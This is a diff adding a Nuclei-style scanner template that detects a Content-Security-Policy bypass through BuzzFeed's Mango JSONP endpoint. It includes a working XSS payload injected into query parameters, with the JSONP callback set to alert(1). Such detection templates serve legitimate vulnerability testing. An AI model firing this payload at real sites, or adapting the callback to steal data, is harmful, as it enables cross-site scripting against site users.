@@ -1,0 +1,55 @@
+id: buzzfeed-mango-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - BuzzFeed Mango
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,buzzfeed-mango
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "buzzfeed.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: buzzfeed_mango_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "buzzfeed_mango_csp_xss == true"
+# digest: 4b0a00483046022100b7e88cd4e9cda5f6bb2258a3fb2212c2c12d4191b2fd8638c07f83c90166e981022100bf1886163b952786b56f6cc8b438e4c746e51bc888187007f3336c52c3a47f69:922c64590222798bb761d5b6d8e72950
